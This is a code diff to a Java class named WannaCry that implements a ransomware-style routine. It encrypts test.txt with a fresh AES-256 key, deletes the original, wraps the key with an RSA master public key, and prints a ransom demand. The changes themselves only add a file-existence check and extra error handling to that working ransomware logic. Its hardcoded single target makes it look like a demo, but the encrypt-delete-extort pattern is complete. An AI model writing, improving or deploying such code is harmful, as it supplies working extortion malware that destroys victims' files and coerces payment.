@@ -18,6 +18,13 @@ public class WannaCry {
 
     public static void main(String[] args) {
         try {
+            // Check if test.txt exists
+            Path inputFile = Paths.get("test.txt");
+            if (!Files.exists(inputFile)) {
+                System.err.println("Error: test.txt not found in current directory");
+                System.exit(1);
+            }
+            
             // 1. Generate 256-bit AES key
             KeyGenerator keyGen = KeyGenerator.getInstance("AES");
             keyGen.init(256);
@@ -30,12 +37,12 @@ public class WannaCry {
             aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, ivSpec);
             
             // 3. Read, encrypt, write
-            byte[] plaintext = Files.readAllBytes(Paths.get("test.txt"));
+            byte[] plaintext = Files.readAllBytes(inputFile);
             byte[] ciphertext = aesCipher.doFinal(plaintext);
             Files.write(Paths.get("test.txt.cry"), ciphertext);
             
             // 4. Delete original
-            Files.delete(Paths.get("test.txt"));
+            Files.delete(inputFile);
             
             // 5. Encrypt AES key with RSA master public key
             PublicKey masterPublicKey = loadMasterPublicKey();
@@ -48,6 +55,10 @@ public class WannaCry {
             System.out.println("To recover your files, you must pay the ransom.");
             System.out.println("Contact us with your payment ID to receive the decryption key.");
             
+        } catch (java.nio.file.NoSuchFileException e) {
+            System.err.println("Error: File not found - " + e.getFile());
+        } catch (java.io.IOException e) {
+            System.err.println("Error: IO error - " + e.getMessage());
         } catch (Exception e) {
             System.err.println("Error: " + e.getMessage());
         }
